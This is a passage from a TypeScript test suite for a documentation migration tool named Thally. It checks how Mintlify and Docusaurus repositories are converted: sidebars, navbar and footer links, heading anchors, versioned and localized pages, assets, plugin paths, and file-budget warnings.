    const warning = bundle.warnings.find((entry) => entry.code === 'limit-reached')
    expect(warning?.message).toContain('10 page(s) were left out')
    expect(warning?.message).toContain('en/page-0050.mdx')
    expect(warning?.message).toContain('--docs-dir')
    expect(warning?.message).toContain('and 7 more')
    expect(warning?.message).not.toMatch(/lower-priority|budget/)
  }, 30_000)

  // Regression test for the bug fixed alongside the file-cap prioritization
  // above: pages and assets used to share one MAX_SOURCE_FILES budget, so a
  // Mintlify project with more navigation-referenced *pages* than the
  // budget filled the whole budget with pages before a single asset was
  // ever considered — even though the asset was well within its own
  // MAX_ASSET_BYTES/MAX_TOTAL_ASSET_BYTES limits.
  it('still copies a referenced asset when navigation-referenced pages alone exceed the file budget', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-asset-budget-'))
    mkdirSync(join(root, 'en'), { recursive: true })
    mkdirSync(join(root, 'images'), { recursive: true })
    const pageIds = Array.from({ length: 51 }, (_, index) => `en/page-${index}`)
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { tabs: [{ tab: 'Guides', groups: [{ group: 'Start', pages: pageIds }] }] },
    }))
    for (const id of pageIds) {
      const isFirst = id === pageIds[0]
      writeFileSync(join(root, `${id}.mdx`), `---\ntitle: ${id}\n---\n\n${
        isFirst ? '![Diagram](/images/diagram.png)' : 'Filler page.'
      }`)
    }
    writeFileSync(join(root, 'images', 'diagram.png'), 'fake-png-bytes')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs', maxSourceFiles: 50 })

    expect(bundle.assets.map((asset) => asset.path)).toContain('images/diagram.png')
  }, 30_000)

  // Regression test for a second bug found alongside the two above: a real
  // file Mintlify still serves by file-based routing even though nothing in
  // the sidebar links to it (an "orphan" page, e.g. crewAI's
  // tools/web-scraping/firecrawlsearchtool.mdx) used to get the exact same
  // flat lowest priority regardless of which version it belonged to. When a
  // repository's total *unreferenced* page count alone exceeds the budget,
  // that let an older, non-default version's orphan pages crowd out the
  // default version's own orphan pages purely by scan order.
  it('keeps the default version\'s own unreferenced pages over an older version\'s when discovery exceeds the file budget', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-orphan-budget-'))
    mkdirSync(join(root, 'v2', 'en'), { recursive: true })
    mkdirSync(join(root, 'v1', 'en'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: {
        versions: [
          { version: 'v1', tabs: [{ tab: 'Guides', groups: [{ group: 'Start', pages: ['v1/en/introduction'] }] }] },
          { version: 'v2', default: true, tabs: [{ tab: 'Guides', groups: [{ group: 'Start', pages: ['v2/en/introduction'] }] }] },
        ],
      },
    }))
    writeFileSync(join(root, 'v2', 'en', 'introduction.mdx'), '---\ntitle: Welcome v2\n---\n\nDefault version docs.')
    writeFileSync(join(root, 'v1', 'en', 'introduction.mdx'), '---\ntitle: Welcome v1\n---\n\nOlder version docs.')
    // A real file that exists but is never linked from the nav — Mintlify
    // still serves it, so it must survive the budget ahead of an older
    // version's unreferenced filler pages.
    writeFileSync(join(root, 'v2', 'en', 'orphan.mdx'), '---\ntitle: Orphan v2\n---\n\nNot in the sidebar, but live on the site.')
    // Enough unreferenced filler under the older, non-default version to
    // push total discovery past the 5,000-file budget on its own.
    for (let index = 0; index < 50; index++) {
      writeFileSync(join(root, 'v1', 'en', `filler-${index}.mdx`), `---\ntitle: Filler ${index}\n---\n\nUnreferenced filler page.`)
    }

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs', maxSourceFiles: 50 })

    const pageIds = bundle.pages.map((page) => page.id)
    expect(pageIds).toContain('v2/en/orphan')
  }, 30_000)
})

function docusaurusFixture(sidebarSource?: string): string {
  const root = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-'))
  mkdirSync(join(root, 'docs', 'guide'), { recursive: true })
  mkdirSync(join(root, 'docs', 'api'), { recursive: true })
  mkdirSync(join(root, 'static', 'img'), { recursive: true })
  writeFileSync(join(root, 'docusaurus.config.ts'), "export default { presets: [['classic', { docs: { sidebarPath: './sidebars.ts' } }]] }")
  writeFileSync(join(root, 'sidebars.ts'), sidebarSource ?? `
    import type { SidebarsConfig } from '@docusaurus/plugin-content-docs'
    const sidebars: SidebarsConfig = {
      docs: [
        'intro',
        {
          type: 'category',
          label: 'Guides',
          link: { type: 'generated-index', slug: '/guides', description: 'Choose a guide.' },
          items: [
            { type: 'doc', id: 'guide/getting-started' },
            { type: 'autogenerated', dirName: 'api' },
          ],
        },
      ],
    }
    export default sidebars
  `)
  writeFileSync(join(root, 'docs', '01-intro.md'), '---\nid: intro\nslug: /\ntitle: Welcome\n---\n\nDocusaurus introduction.')
  writeFileSync(join(root, 'docs', 'guide', '01-start.md'), '---\nid: getting-started\nslug: /start-here\ntitle: Get started\n---\n\n:::tip[Fast path]\nShip it.\n:::\n\n[Call the endpoint](../api/02-endpoint.md#call)')
  writeFileSync(join(root, 'docs', 'api', '02-endpoint.mdx'), `---\ntitle: Endpoint\nsidebar_position: 2\n---\n\nimport Tabs from '@theme/Tabs'\nimport TabItem from '@theme/TabItem'\n\n<Tabs>\n<TabItem value="curl" label="cURL">Run curl.</TabItem>\n</Tabs>`)
  writeFileSync(join(root, 'docs', 'api', '01-auth.md'), '---\ntitle: Authentication\nsidebar_position: 1\n---\n\nAuthenticate first.')
  writeFileSync(join(root, 'static', 'img', 'logo.svg'), '<svg xmlns="http://www.w3.org/2000/svg"/>')
  return root
}

describe('Docusaurus repository migration', () => {
  it('expands category DocCardList at its authored position', () => {
    const root = docusaurusFixture("export default { docs: [{ type: 'autogenerated', dirName: '.' }] }")
    mkdirSync(join(root, 'docs', 'user-guide'), { recursive: true })
    writeFileSync(join(root, 'docs', 'user-guide', '_category_.json'), '{"label":"User Guide","position":1}')
    writeFileSync(join(root, 'docs', 'user-guide', 'index.md'), '---\ntitle: User Guide\n---\n\nBefore cards.\n\n<DocCardList />\n\nAfter cards.')
    writeFileSync(join(root, 'docs', 'user-guide', 'start.md'), '---\ntitle: Start\n---\n\nStart here.')
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const body = bundle.pages.find((page) => page.navigationId === 'user-guide')?.body ?? ''
    expect(body).toContain('<Card title={"Start"} href={"/user-guide/start"} />')
    expect(body.indexOf('Before cards.')).toBeLessThan(body.indexOf('<CardGroup>'))
    expect(body.indexOf('<CardGroup>')).toBeLessThan(body.indexOf('After cards.'))
    expect(body).not.toContain('data-thally-doc-card-list')
    expect(bundle.docsConfig.api?.specLink).toBeUndefined()
  })

  it('hoists index-only folders into authored sidebar order', () => {
    const root = docusaurusFixture("export default { docs: [{ type: 'autogenerated', dirName: '.' }] }")
    mkdirSync(join(root, 'docs', 'self-hosting', 'installation'), { recursive: true })
    mkdirSync(join(root, 'docs', 'self-hosting', 'configuration'), { recursive: true })
    writeFileSync(join(root, 'docs', 'self-hosting', '_category_.json'), '{"label":"Self-Hosting","position":2}')
    writeFileSync(join(root, 'docs', 'self-hosting', 'installation', 'index.md'), '---\nslug: /installation\nsidebar_position: 1\n---\n# Installation')
    writeFileSync(join(root, 'docs', 'self-hosting', 'configuration', 'index.md'), '---\nsidebar_position: 3\n---\n# Configuration')
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const group = bundle.docsConfig.tabs[0].pages?.find((item) => typeof item !== 'string' && item.group === 'Self-Hosting')
    expect(group && typeof group !== 'string' ? group.pages.slice(0, 2) : []).toEqual(['installation', 'self-hosting/configuration'])
  })

  it('keeps sidebar categories collapsible and in source order', () => {
    const bundle = migrateRepository({ repositoryDir: docusaurusFixture(), sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.docsConfig.tabs[0].pages).toEqual([
      'introduction',
      {
        group: 'Guides',
        pages: [
          'guides',
          'start-here',
          'api/auth',
          'api/endpoint',
        ],
      },
    ])
    expect(bundle.docsConfig.tabs[0].groups).toBeUndefined()
  })
  it('chooses the classic docs sidebar when a separate docs plugin is configured first', () => {
    const root = docusaurusFixture(`
      const sidebars = {
        docs: ['intro'],
        api: [{ type: 'autogenerated', dirName: 'api' }],
      }
      export default sidebars
    `)
    writeFileSync(join(root, 'community.js'), "module.exports = { community: [{ type: 'autogenerated', dirName: '.' }] }")
    writeFileSync(join(root, 'docusaurus.config.ts'), `
      export default {
        plugins: [['content-docs', { id: 'community', sidebarPath: './community.js' }]],
        presets: [['classic', { docs: { path: 'docs', sidebarPath: './sidebars.ts' } }]],
      }
    `)
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.docsConfig.tabs.map((tab) => tab.tab)).toEqual(['Docs', 'API'])
  })

  it('projects static site identity, navbar destinations, and footer columns', () => {
    const root = docusaurusFixture()
    writeFileSync(join(root, 'docusaurus.config.ts'), `
      const GITHUB_URL = 'https://github.com/acme/docs'
      export default {
        title: 'Acme Docs', tagline: 'Build with Acme', url: 'https://docs.acme.test',
        presets: [['classic', { "docs": { "routeBasePath": '/', sidebarPath: './sidebars.ts' } }]],
        themeConfig: {
          navbar: { items: [
            { label: 'Start', to: '/start-here' },
            { label: 'Blog', to: '/blog' },
          ] },
          footer: {
            links: [{ title: 'Resources', items: [
              { label: 'Start', to: '/start-here' },
              { label: 'GitHub', href: GITHUB_URL },
            ] }],
            copyright: \`Copyright © 2020-\${new Date().getFullYear()} Acme\`,
          },
        },
      }
    `)
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docusaurus-docs', platform: 'docusaurus' })
    expect(bundle.site).toMatchObject({ name: 'Acme Docs', description: 'Build with Acme' })
    expect(bundle.docsConfig.navbar?.links).toEqual([
      { label: 'Start', href: '/start-here' },
      { label: 'Blog', href: 'https://docs.acme.test/blog' },
    ])
    expect(bundle.docsConfig.footer).toMatchObject({
      copyright: 'Copyright © 2020-{year} Acme',
      links: [{ heading: 'Resources', items: [
        { label: 'Start', href: '/start-here' },
        { label: 'GitHub', href: 'https://github.com/acme/docs' },
      ] }],
    })
  })

  it('keeps site sections outside the Docusaurus docs mount on the source domain', () => {
    const root = docusaurusFixture()
    writeFileSync(join(root, 'docs', 'blog.md'), '---\ntitle: Blog\n---\n\nHow to configure the blog.')
    writeFileSync(join(root, 'docusaurus.config.ts'), `
      export default {
        url: 'https://docs.acme.test',
        presets: [['classic', { docs: { sidebarPath: './sidebars.ts' } }]],
        themeConfig: { navbar: { items: [
          { label: 'Blog', to: '/blog' },
          { label: 'Docs', to: '/docs/start-here' },
        ] } },
      }
    `)
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.docsConfig.navbar?.links).toEqual([
      { label: 'Blog', href: 'https://docs.acme.test/blog' },
      { label: 'Docs', href: '/start-here' },
    ])
  })

  it('resolves Docusaurus doc and docSidebar navbar items to imported pages', () => {
    const root = docusaurusFixture(`export default { docs: ['intro'], api: [{ type: 'autogenerated', dirName: 'api' }] }`)
    writeFileSync(join(root, 'docusaurus.config.ts'), `
      export default {
        presets: [['classic', { docs: { sidebarPath: './sidebars.ts' } }]],
        themeConfig: { navbar: { items: [
          { type: 'doc', docId: 'intro', label: 'Docs' },
          { type: 'docSidebar', sidebarId: 'api', label: 'API' },
        ] } },
      }
    `)
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.docsConfig.navbar?.links).toEqual([
      { label: 'Docs', href: '/introduction' },
      { label: 'API', href: '/api/auth' },
    ])
  })

  it('rewrites reference-style Markdown links to imported page routes', () => {
    const root = docusaurusFixture()
    writeFileSync(join(root, 'docs', 'compare.md'), [
      '---', 'title: Compare', '---', '',
      'Read [Getting started] before comparing options.',
      '',
      '[Getting started]: ./guide/01-start.md#install',
      '```md',
      '[Example]: ./guide/01-start.md',
      '```',
    ].join('\n'))
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docusaurus-docs', platform: 'docusaurus' })
    const body = bundle.pages.find((page) => page.id === 'compare')?.body ?? ''
    expect(body).toContain('[Getting started]: /start-here#install')
    expect(body).toContain('[Example]: ./guide/01-start.md')
  })

  it('anchors the nearest repeated option field for an unambiguous local link', () => {
    const root = docusaurusFixture()
    writeFileSync(join(root, 'docs', 'options.md'), [
      '# Options',
      '| Field | Value |',
      '| --- | --- |',
      '| `tags` | Global tags |',
      '',
      '## Per-page options',
      '| Field | Value |',
      '| --- | --- |',
      '| `tags` | Page tags |',
      '',
      'Use the [`tags` option](#tags) here.',
    ].join('\n'))
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docusaurus-docs', platform: 'docusaurus' })
    const body = bundle.pages.find((page) => page.id === 'options')?.body ?? ''
    expect(body).toContain('| <a id="tags"></a>`tags` | Page tags |')
    expect(body).toContain('| `tags` | Global tags |')
  })

  it('retains linked source heading IDs when Thally uses a different slug', () => {
    const root = docusaurusFixture()
    writeFileSync(join(root, 'docs', 'slug-test.md'), [
      '---', 'title: Slug test', '---', '',
      '### nodeLinker',
      '### --report-summary',
      '| Option | Type |',
      '| --- | --- |',
      '| `disableInDev` | boolean |',
      '```md', '### codeOnly', '```',
    ].join('\n'))
    writeFileSync(join(root, 'docs', 'link-source.md'), [
      '---', 'title: Link source', '---', '',
      '[Settings](/slug-test#nodeLinker)',
      '<a href="/slug-test#--report-summary">Summary</a>',
      '[Option](/slug-test#disableInDev)',
      '[Code](/slug-test#codeOnly)',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docusaurus-docs', platform: 'docusaurus' })
    const body = bundle.pages.find((page) => page.id === 'slug-test')?.body ?? ''
    expect(body).toContain('<a id="nodeLinker"></a>\n### nodeLinker')
    expect(body).toContain('<a id="--report-summary"></a>\n### --report-summary')
    expect(body).toContain('| <a id="disableInDev"></a>`disableInDev` | boolean |')
    expect(body).not.toContain('id="codeOnly"')
  })

  it('inlines escaped Markdown partial imports and hoists their page imports', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-partial-'))
    mkdirSync(join(root, 'docs'))
    writeFileSync(join(root, 'docusaurus.config.js'), 'module.exports = { title: "Docs" }')
    writeFileSync(join(root, 'docs', '_shared.md'), "import Tabs from '@theme/Tabs';\n\n<Tabs><TabItem value=\"a\">Shared guide</TabItem></Tabs>")
    writeFileSync(join(root, 'docs', 'index.md'), "import Shared from './\\_shared.md';\n\n<Shared />")
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.pages.map((page) => page.id)).toContain('introduction')
    expect(bundle.pages[0].body).toContain('Shared guide')
    expect(bundle.pages[0].body).not.toContain('@theme/Tabs')
    expect(bundle.warnings.some((warning) => warning.code === 'skipped-file')).toBe(false)
  })

  it('maps current-version doc links and preserves out-of-scope site links', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-links-'))
    mkdirSync(join(root, 'docs'))
    writeFileSync(join(root, 'docusaurus.config.js'), 'module.exports = { "url": "https://docs.example.com", title: "Docs" }')
    writeFileSync(join(root, 'docs', 'index.md'), '# Home\n\n[Guide](/docs/next/guide) [News](/blog/post)')
    writeFileSync(join(root, 'docs', 'guide.md'), '# Guide')
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const home = bundle.pages.find((page) => page.id === 'introduction')
    expect(home?.body).toContain('[Guide](/guide)')
    expect(home?.body).toContain('[News](https://docs.example.com/blog/post)')
    expect(bundle.warnings.some((warning) => warning.message.includes('outside the imported Docusaurus docs'))).toBe(true)
  })
  it('prefers the project root with the most pages when more than one docusaurus.config.* exists, and warns about the ambiguity', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-multiroot-'))
    mkdirSync(join(root, 'archive', 'docs'), { recursive: true })
    writeFileSync(join(root, 'archive', 'docusaurus.config.js'), 'module.exports = {}')
    writeFileSync(join(root, 'archive', 'docs', 'old.md'), '# Old')
    mkdirSync(join(root, 'website', 'docs'), { recursive: true })
    writeFileSync(join(root, 'website', 'docusaurus.config.js'), 'module.exports = {}')
    writeFileSync(join(root, 'website', 'docs', 'intro.md'), '# Intro')
    writeFileSync(join(root, 'website', 'docs', 'guide.md'), '# Guide')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs', platform: 'docusaurus' })

    expect(bundle.pages.map((page) => page.id).sort()).toEqual(['guide', 'intro'])
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringMatching(/Multiple possible Docusaurus project roots.*archive.*website.*website was picked/s),
    }))
  })


  it('projects static sidebars, routes, generated indexes, syntax, and static assets', () => {
    const bundle = migrateRepository({
      repositoryDir: docusaurusFixture(),
      sourceUrl: 'https://github.com/acme/docusaurus-docs',
      platform: 'docusaurus',
    })

    expect(bundle.platform).toBe('docusaurus')
    expect(bundle.pages.map((page) => page.id)).toEqual([
      'introduction',
      'api/auth',
      'api/endpoint',
      'start-here',
      'guides',
    ])
    expect(bundle.pages.find((page) => page.id === 'start-here')?.body).toContain('<Note>\n**Fast path**')
    expect(bundle.pages.find((page) => page.id === 'start-here')?.body).toContain('[Call the endpoint](/api/endpoint#call)')
    expect(bundle.pages.find((page) => page.id === 'api/endpoint')?.body).toContain('<Tab title="cURL">')
    expect(bundle.pages.find((page) => page.id === 'api/endpoint')?.body).not.toContain('@theme/Tab')
    expect(bundle.docsConfig.tabs[0]).toEqual({
      tab: 'Documentation',
      pages: [
        'introduction',
        { group: 'Guides', pages: ['guides', 'start-here', 'api/auth', 'api/endpoint'] },
      ],
    })
    expect(bundle.assets.map((asset) => asset.path)).toContain('img/logo.svg')
  })

  it('strips an unsupported npm-package MDX import from a Docusaurus page instead of shipping a broken build', () => {
    const root = docusaurusFixture()
    writeFileSync(join(root, 'docs', 'api', '01-auth.md'),
      "---\ntitle: Authentication\nsidebar_position: 1\n---\n\nimport LiteYouTubeEmbed from 'react-lite-youtube-embed';\n\n<LiteYouTubeEmbed id=\"abc123\" />")
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docusaurus-docs', platform: 'docusaurus' })
    const page = bundle.pages.find((page) => page.id === 'api/auth')
    expect(page?.body).not.toContain('react-lite-youtube-embed')
    expect(page?.body).toContain('<iframe')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      message: expect.stringContaining("'react-lite-youtube-embed'"),
    }))
  })

  it('retains versioned and localized Docusaurus docs in distinct routes', () => {
    const root = docusaurusFixture()
    writeFileSync(join(root, 'versions.json'), '["1.0"]')
    mkdirSync(join(root, 'versioned_docs', 'version-1.0'), { recursive: true })
    writeFileSync(join(root, 'versioned_docs', 'version-1.0', 'intro.md'), 'Old intro. [Guide](./guide.md)')
    writeFileSync(join(root, 'versioned_docs', 'version-1.0', 'guide.md'), 'Old guide.')
    mkdirSync(join(root, 'versioned_sidebars'), { recursive: true })
    writeFileSync(join(root, 'versioned_sidebars', 'version-1.0-sidebars.json'), '{"docs":["intro","guide"]}')
    mkdirSync(join(root, 'i18n', 'fr', 'docusaurus-plugin-content-docs', 'current'), { recursive: true })
    writeFileSync(join(root, 'i18n', 'fr', 'docusaurus-plugin-content-docs', 'current', 'intro.md'), 'Bonjour.\n\n<img src="/docs/img/demo.png" />')
    mkdirSync(join(root, 'static', 'img'), { recursive: true })
    writeFileSync(join(root, 'static', 'img', 'demo.png'), 'image')
    mkdirSync(join(root, 'i18n', 'fr', 'docusaurus-plugin-content-docs', 'version-2.0'), { recursive: true })
    writeFileSync(join(root, 'i18n', 'fr', 'docusaurus-plugin-content-docs', 'version-2.0', 'intro.md'), 'Bonjour version deux.')
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docusaurus-docs', platform: 'docusaurus' })
    expect(bundle.pages).toEqual(expect.arrayContaining([
      expect.objectContaining({ navigationId: '1.0/intro', body: expect.stringContaining('[Guide](/1.0/guide)') }),
      expect.objectContaining({ navigationId: '1.0/guide', body: expect.stringContaining('Old guide.') }),
      expect.objectContaining({ navigationId: 'fr/intro', body: expect.stringContaining('<img src="/img/demo.png" />') }),
      expect.objectContaining({ navigationId: 'fr/2.0/intro', body: expect.stringContaining('Bonjour version deux.') }),
    ]))
    expect(bundle.docsConfig.tabs.some((tab) => tab.tab === 'Version 1.0')).toBe(true)
    expect(JSON.stringify(bundle.docsConfig.tabs)).toContain('1.0/guide')
    expect(bundle.warnings.some((warning) => warning.message.includes('were skipped; only current docs'))).toBe(false)
  })

  it('never executes sidebar modules and falls back when their export is executable', () => {
    const repositoryDir = docusaurusFixture(`
      throw new Error('this source module must never execute')
      module.exports = { docs: buildSidebar() }
    `)
    const bundle = migrateRepository({
      repositoryDir,
      sourceUrl: 'https://github.com/acme/docusaurus-docs',
      platform: 'docusaurus',
    })

    expect(bundle.pages.length).toBeGreaterThan(0)
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringContaining('could not be read safely'),
    }))
    expect(bundle.docsConfig.tabs[0].tab).toBe('Documentation')
  })

  it("finds the primary docs instance's default 'docs' directory instead of a later plugin's path (hasura/graphql-engine shape: preset docs: {} has no path, a sibling content-docs plugin does)", () => {
    const repositoryDir = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-primary-path-'))
    mkdirSync(join(repositoryDir, 'docs'), { recursive: true })
    mkdirSync(join(repositoryDir, 'wiki'), { recursive: true })
    writeFileSync(join(repositoryDir, 'docusaurus.config.js'), `
      module.exports = {
        presets: [
          ['classic', {
            docs: {
              routeBasePath: '/',
              sidebarPath: require.resolve('./sidebars.js'),
              versions: {
                current: { label: 'v2.x', badge: true, path: '' },
              },
            },
          }],
        ],
        plugins: [[
          'content-docs',
          { id: 'wiki', path: 'wiki', routeBasePath: 'wiki' },
        ]],
      }
    `)
    writeFileSync(join(repositoryDir, 'docs', 'index.mdx'), '---\ntitle: Introduction\n---\n\nMain docs.')
    writeFileSync(join(repositoryDir, 'wiki', 'index.mdx'), '---\ntitle: Wiki\n---\n\nWiki introduction.')

    const bundle = migrateRepository({ repositoryDir, sourceUrl: 'https://github.com/hasura/graphql-engine' })

    expect(bundle.pages.some((page) => page.body.includes('Main docs.'))).toBe(true)
    expect(bundle.pages.some((page) => page.body.includes('Wiki introduction.'))).toBe(true)
  })

  it("removes an unresolvable @site component import on a page whose heading has an explicit {#id} anchor (components.ts's own MDX parse used to choke on the {#id} before it ever reached the import, leaving it in the emitted page and breaking next build)", () => {
    const repositoryDir = docusaurusFixture()
    writeFileSync(join(repositoryDir, 'docs', 'custom-heading-id-guide.mdx'), [
      "import Thumbnail from '@site/src/components/Thumbnail';",
      '',
      '# Guide {#custom-guide-id}',
      '',
      '<Thumbnail src="/img/x.png" />',
      '',
      'Body text.',
    ].join('\n'))
    const bundle = migrateRepository({ repositoryDir, sourceUrl: 'https://github.com/acme/docusaurus-docs', platform: 'docusaurus' })
    const page = bundle.pages.find((p) => p.body.includes('Body text.'))!
    expect(page).toBeDefined()
    expect(page.body).not.toContain("from '@site/src/components/Thumbnail'")
    expect(page.body).toContain('<a id="custom-guide-id"></a>')
  })

  it("preserves a case-preserved heading id used in a link's #fragment (live Docusaurus renders a heading's id with case intact; Thally always lowercases its auto-slug) by anchoring the target heading, leaving the link itself untouched", () => {
    const repositoryDir = docusaurusFixture()
    writeFileSync(join(repositoryDir, 'docs', 'api', '01-auth.md'), '---\ntitle: Authentication\nsidebar_position: 1\n---\n\n## Using AI Agents With Cypress\n\nDetails.')
    writeFileSync(join(repositoryDir, 'docs', 'guide', '02-faq.md'), [
      '---',
      'title: FAQ',
      '---',
      '',
      '[See the section](../api/01-auth.md#Using-AI-Agents-With-Cypress)',
      '',
      'Self link too: [here](#Self-Section)',
      '',
      '## Self Section',
    ].join('\n'))
    const bundle = migrateRepository({ repositoryDir, sourceUrl: 'https://github.com/acme/docusaurus-docs', platform: 'docusaurus' })
    const faq = bundle.pages.find((page) => page.body.includes('See the section'))!
    const auth = bundle.pages.find((page) => page.id === 'api/auth')!
    expect(faq).toBeDefined()
    expect(auth).toBeDefined()
    expect(faq.body).toContain('(/api/auth#Using-AI-Agents-With-Cypress)')
    expect(faq.body).toContain('(#Self-Section)')
    expect(auth.body).toContain('<a id="Using-AI-Agents-With-Cypress"></a>\n## Using AI Agents With Cypress')
    expect(faq.body).toContain('<a id="Self-Section"></a>\n## Self Section')
  })

  it('discovers monorepo projects, static external wrappers, aliases, plugins, and literal index slugs', () => {
    const repositoryDir = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-monorepo-'))
    const siteRoot = join(repositoryDir, 'packages', 'website')
    mkdirSync(join(siteRoot, 'docs', 'API'), { recursive: true })
    mkdirSync(join(siteRoot, 'docs', 'filters'), { recursive: true })
    mkdirSync(join(siteRoot, 'wiki', 'style'), { recursive: true })
    mkdirSync(join(siteRoot, 'static', 'img'), { recursive: true })
    writeFileSync(join(siteRoot, 'docusaurus.config.ts'), `
      export default {
        presets: [['classic', { docs: { path: 'docs', sidebarPath: './sidebars.js' } }]],
        plugins: [[
          '@docusaurus/plugin-content-docs',
          { id: 'wiki', path: 'wiki', routeBasePath: 'wiki' },
        ]],
      }
    `)
    writeFileSync(join(siteRoot, 'sidebars.js'), `
      module.exports = {
        docs: ['index', { 'API Reference': [
          ...fbContent({ internal: ['internal/secret'], external: ['API/Type', 'filters/index'] }),
        ] }],
      }
    `)
    writeFileSync(join(siteRoot, 'docs', '_partial.mdx'), 'Portable imported prerequisite.')
    writeFileSync(join(siteRoot, 'docs', 'index.mdx'), "---\ntitle: Introduction\n---\n\nimport Partial from '@site/docs/_partial.mdx';\n\n<Partial />")
    writeFileSync(join(siteRoot, 'docs', 'API', 'Type.mdx'), '---\ntitle: Type\n---\n\nCase-sensitive API type.')
    writeFileSync(join(siteRoot, 'docs', 'filters', 'index.mdx'), '---\ntitle: Filters\nslug: index\n---\n\nFilter reference.')
    writeFileSync(join(siteRoot, 'wiki', 'index.mdx'), '---\ntitle: Wiki\n---\n\nWiki introduction.')
    writeFileSync(join(siteRoot, 'wiki', 'style', '_category_.json'), JSON.stringify({
      label: 'Style',
      link: { type: 'generated-index', title: 'Style index' },
    }))
    writeFileSync(join(siteRoot, 'wiki', 'style', 'writing.mdx'), '---\ntitle: Writing\n---\n\nWriting guidance.')
    writeFileSync(join(siteRoot, 'static', 'img', 'logo.svg'), '<svg xmlns="http://www.w3.org/2000/svg"/>')

    const bundle = migrateRepository({
      repositoryDir,
      sourceUrl: 'https://github.com/acme/monorepo',
    })

    expect(bundle.platform).toBe('docusaurus')
    expect(bundle.pages.map((page) => page.id)).toEqual([
      'API/Type',
      'filters/index/index',
      'introduction',
      'wiki',
      'wiki/style/writing',
      'wiki/category/style',
    ])
    expect(bundle.pages.find((page) => page.id === 'introduction')?.body).toContain('Portable imported prerequisite.')
    expect(bundle.pages.map((page) => page.id)).not.toContain('_partial')
    expect(bundle.docsConfig.tabs.map((tab) => tab.tab)).toEqual(['Documentation', 'Wiki'])
    expect(bundle.docsConfig.tabs[1].href).toBe('/wiki')
    expect(bundle.docsConfig.tabs[0].pages).toEqual([
      'introduction',
      { group: 'API Reference', pages: ['API/Type', 'filters/index'] },
    ])
    expect(bundle.assets.map((asset) => asset.path)).toContain('img/logo.svg')
  })

  it('imports a content-docs plugin instance whose path lives at the repository root, not nested under the project root (Playwright: community/mcp/agent-cli are siblings of the nodejs/ project)', () => {
    const repositoryDir = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-sibling-plugin-'))
    const siteRoot = join(repositoryDir, 'nodejs')
    mkdirSync(join(siteRoot, 'docs'), { recursive: true })
    mkdirSync(join(repositoryDir, 'community'), { recursive: true })
    writeFileSync(join(siteRoot, 'docusaurus.config.ts'), `
      export default {
        presets: [['classic', { docs: { path: 'docs', sidebarPath: './sidebars.js' } }]],
        plugins: [[
          '@docusaurus/plugin-content-docs',
          { id: 'community', path: 'community', routeBasePath: 'community' },
        ]],
      }
    `)
    writeFileSync(join(siteRoot, 'docs', 'index.mdx'), '---\ntitle: Introduction\n---\n\nMain docs.')
    writeFileSync(join(repositoryDir, 'community', 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nCommunity welcome page.')

    const bundle = migrateRepository({ repositoryDir, sourceUrl: 'https://github.com/acme/monorepo' })

    expect(bundle.pages.some((page) => page.body.includes('Community welcome page.'))).toBe(true)
    expect(bundle.docsConfig.tabs.map((tab) => tab.tab)).toContain('Community')
    expect(bundle.warnings).not.toContainEqual(expect.objectContaining({ code: 'unsupported-config', message: expect.stringContaining('community') }))
  })

  it('warns (instead of silently dropping) a content-docs plugin instance whose path cannot be found anywhere in the repository', () => {
    const repositoryDir = mkdtempSync(join(tmpdir(), 'thally-migrate-docusaurus-missing-plugin-'))
    const siteRoot = join(repositoryDir, 'nodejs')
    mkdirSync(join(siteRoot, 'docs'), { recursive: true })
    writeFileSync(join(siteRoot, 'docusaurus.config.ts'), `
      export default {
        presets: [['classic', { docs: { path: 'docs', sidebarPath: './sidebars.js' } }]],
        plugins: [[
          '@docusaurus/plugin-content-docs',
          { id: 'wiki', path: 'wiki', routeBasePath: 'wiki' },
        ]],
      }
    `)
    writeFileSync(join(siteRoot, 'docs', 'index.mdx'), '---\ntitle: Introduction\n---\n\nMain docs.')

    const bundle = migrateRepository({ repositoryDir, sourceUrl: 'https://github.com/acme/monorepo' })

    expect(bundle.warnings).toContainEqual(expect.objectContaining({
